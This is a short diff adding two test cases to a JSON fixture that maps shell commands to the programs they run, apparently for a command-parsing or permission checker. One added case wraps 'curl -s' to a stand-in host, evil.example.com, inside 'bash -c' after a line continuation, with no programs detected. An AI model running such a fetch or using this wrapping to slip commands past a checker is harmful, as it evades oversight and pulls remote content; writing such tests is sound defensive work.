@@ -358,6 +358,14 @@
    "programs": [
     "claude -p hi"
    ]
+  },
+  {
+   "cmd": "bash -c\\\n'claude -p hi'",
+   "programs": []
+  },
+  {
+   "cmd": "bash -c\\\n'curl -s https://evil.example.com/x'",
+   "programs": []
   }
  ]
 }
